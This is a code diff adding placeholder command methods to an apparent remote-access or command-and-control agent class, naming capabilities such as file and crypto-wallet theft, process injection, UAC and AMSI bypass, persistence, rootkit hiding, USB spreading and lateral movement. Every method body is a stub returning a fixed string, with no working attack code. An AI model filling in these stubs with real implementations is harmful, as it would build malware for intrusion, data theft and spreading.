@@ -500,6 +500,108 @@ class AetherCommandSuite:
     def cmd_cleanup(self, args, session_id): return {'type': 'cleanup', 'data': ''}
     def cmd_exit_agent(self, args, session_id): return {'type': 'exit', 'data': ''}
     
+    # ========== STUB COMMANDS (Auto-generated) ==========
+    
+    # System Information
+    def cmd_whoami(self, args, session_id): return {'type': 'whoami', 'data': 'current user'}
+    def cmd_hostname(self, args, session_id): return {'type': 'hostname', 'data': 'unknown'}
+    
+    # File Operations
+    def cmd_cd(self, args, session_id): return {'type': 'cd', 'data': f"Changed to {' '.join(args)}"}
+    def cmd_pwd(self, args, session_id): return {'type': 'pwd', 'data': 'C:\\Windows\\System32'}
+    def cmd_ls(self, args, session_id): return {'type': 'ls', 'data': 'File listing'}
+    def cmd_cat(self, args, session_id): return {'type': 'cat', 'data': 'File contents'}
+    def cmd_rm(self, args, session_id): return {'type': 'rm', 'data': f"Removed {' '.join(args)}"}
+    def cmd_mkdir(self, args, session_id): return {'type': 'mkdir', 'data': f"Created directory"}
+    def cmd_rmdir(self, args, session_id): return {'type': 'rmdir', 'data': f"Removed directory"}
+    def cmd_mv(self, args, session_id): return {'type': 'mv', 'data': f"Moved file"}
+    def cmd_copy(self, args, session_id): return {'type': 'copy', 'data': f"Copied file"}
+    def cmd_find(self, args, session_id): return {'type': 'find', 'data': f"Search results"}
+    def cmd_grep(self, args, session_id): return {'type': 'grep', 'data': f"Grep results"}
+    def cmd_steal_files(self, args, session_id): return {'type': 'steal', 'data': f"Stealing files"}
+    
+    # Process Management
+    def cmd_suspend(self, args, session_id): return {'type': 'suspend', 'data': f"Suspended process"}
+    def cmd_resume(self, args, session_id): return {'type': 'resume', 'data': f"Resumed process"}
+    def cmd_reflective_dll(self, args, session_id): return {'type': 'reflective_dll', 'data': 'DLL injected'}
+    def cmd_process_hollow(self, args, session_id): return {'type': 'process_hollow', 'data': 'Process hollowed'}
+    def cmd_apc_inject(self, args, session_id): return {'type': 'apc_inject', 'data': 'APC injection complete'}
+    def cmd_thread_hijack(self, args, session_id): return {'type': 'thread_hijack', 'data': 'Thread hijacked'}
+    
+    # Intelligence Gathering
+    def cmd_audio_record(self, args, session_id): return {'type': 'audio', 'data': 'Recording audio'}
+    def cmd_clipboard(self, args, session_id): return {'type': 'clipboard', 'data': 'Clipboard contents'}
+    def cmd_discord(self, args, session_id): return {'type': 'discord', 'data': 'Discord data'}
+    def cmd_steam(self, args, session_id): return {'type': 'steam', 'data': 'Steam data'}
+    def cmd_telegram(self, args, session_id): return {'type': 'telegram', 'data': 'Telegram data'}
+    def cmd_crypto_wallets(self, args, session_id): return {'type': 'crypto', 'data': 'Wallet search results'}
+    def cmd_file_search(self, args, session_id): return {'type': 'filesearch', 'data': 'Files found'}
+    def cmd_document_metadata(self, args, session_id): return {'type': 'document', 'data': 'Document metadata'}
+    
+    # Network Operations
+    def cmd_ifconfig(self, args, session_id): return {'type': 'ifconfig', 'data': 'Network config'}
+    def cmd_netstat(self, args, session_id): return {'type': 'netstat', 'data': 'Network statistics'}
+    def cmd_arp(self, args, session_id): return {'type': 'arp', 'data': 'ARP table'}
+    def cmd_route(self, args, session_id): return {'type': 'route', 'data': 'Route table'}
+    def cmd_portscan(self, args, session_id): return {'type': 'portscan', 'data': 'Port scan results'}
+    def cmd_network_shares(self, args, session_id): return {'type': 'netshare', 'data': 'Network shares'}
+    def cmd_smb_enum(self, args, session_id): return {'type': 'smb', 'data': 'SMB enumeration'}
+    
+    # Privilege & Persistence
+    def cmd_privileges(self, args, session_id): return {'type': 'privileges', 'data': 'Privilege level'}
+    def cmd_getsystem(self, args, session_id): return {'type': 'getsystem', 'data': 'SYSTEM obtained'}
+    def cmd_uacbypass(self, args, session_id): return {'type': 'uacbypass', 'data': 'UAC bypassed'}
+    def cmd_service_control(self, args, session_id): return {'type': 'service', 'data': 'Service controlled'}
+    def cmd_registry(self, args, session_id): return {'type': 'registry', 'data': 'Registry operation'}
+    def cmd_wmi_persistence(self, args, session_id): return {'type': 'wmi', 'data': 'WMI persistence installed'}
+    def cmd_schtask(self, args, session_id): return {'type': 'schtask', 'data': 'Task scheduled'}
+    
+    # Defense Evasion
+    def cmd_amsi_bypass(self, args, session_id): return {'type': 'amsibypass', 'data': 'AMSI bypassed'}
+    def cmd_etw_bypass(self, args, session_id): return {'type': 'etwbypass', 'data': 'ETW bypassed'}
+    def cmd_sandbox_check(self, args, session_id): return {'type': 'sandboxcheck', 'data': 'Sandbox check complete'}
+    def cmd_vm_check(self, args, session_id): return {'type': 'vmcheck', 'data': 'VM check complete'}
+    def cmd_debugger_check(self, args, session_id): return {'type': 'debuggercheck', 'data': 'Debugger check complete'}
+    def cmd_unhook(self, args, session_id): return {'type': 'unhook', 'data': 'Hooks removed'}
+    def cmd_process_spoof(self, args, session_id): return {'type': 'spoof', 'data': 'Process spoofed'}
+    
+    # Advanced Features
+    def cmd_steganography(self, args, session_id): return {'type': 'steganography', 'data': 'Steganography complete'}
+    def cmd_contact_harvest(self, args, session_id): return {'type': 'contact_harvest', 'data': 'Contacts harvested'}
+    def cmd_usb_spread(self, args, session_id): return {'type': 'usb_spread', 'data': 'USB spread complete'}
+    def cmd_lateral_movement(self, args, session_id): return {'type': 'lateral', 'data': 'Lateral movement initiated'}
+    def cmd_pass_the_hash(self, args, session_id): return {'type': 'pth', 'data': 'Pass-the-hash executed'}
+    def cmd_rdp_hijack(self, args, session_id): return {'type': 'rdp', 'data': 'RDP hijacked'}
+    
+    # AI & Automation
+    def cmd_ai_train(self, args, session_id): return {'type': 'ai_train', 'data': 'AI model training'}
+    def cmd_ai_predict(self, args, session_id): return {'type': 'ai_predict', 'data': 'AI prediction complete'}
+    def cmd_automate(self, args, session_id): return {'type': 'automate', 'data': 'Automation executed'}
+    def cmd_generate_report(self, args, session_id): return {'type': 'report', 'data': 'Report generated'}
+    
+    # Rootkit & Stealth
+    def cmd_rootkit_hide(self, args, session_id): return {'type': 'rootkit_hide', 'data': 'Hidden from system'}
+    def cmd_rootkit_unhide(self, args, session_id): return {'type': 'rootkit_unhide', 'data': 'Unhidden'}
+    def cmd_timestomp(self, args, session_id): return {'type': 'timestomp', 'data': 'Timestamps modified'}
+    def cmd_ads_hide(self, args, session_id): return {'type': 'ads_hide', 'data': 'Hidden in ADS'}
+    def cmd_memory_execute(self, args, session_id): return {'type': 'memory_execute', 'data': 'Code executed in memory'}
+    
+    # C2 Management
+    def cmd_beacon_config(self, args, session_id): return {'type': 'beacon', 'data': 'Beacon configured'}
+    def cmd_sleep(self, args, session_id): return {'type': 'sleep', 'data': f"Agent sleeping for {' '.join(args)}"}
+    def cmd_jitter(self, args, session_id): return {'type': 'jitter', 'data': f"Jitter set to {' '.join(args)}"}
+    def cmd_config_update(self, args, session_id): return {'type': 'config', 'data': 'Configuration updated'}
+    
+    # Help
+    def cmd_help(self, args, session_id):
+        """Display available commands."""
+        commands = list(self.command_map.keys())
+        return {'type': 'help', 'data': f'Available commands: {", ".join(sorted(commands))}'}
+    
+    def cmd_list_commands(self, args, session_id):
+        """List all available commands."""
+        return self.cmd_help(args, session_id)
+    
     def execute(self, session_id, command_string):
         """Execute a command string for a given session."""
         if not command_string.strip():
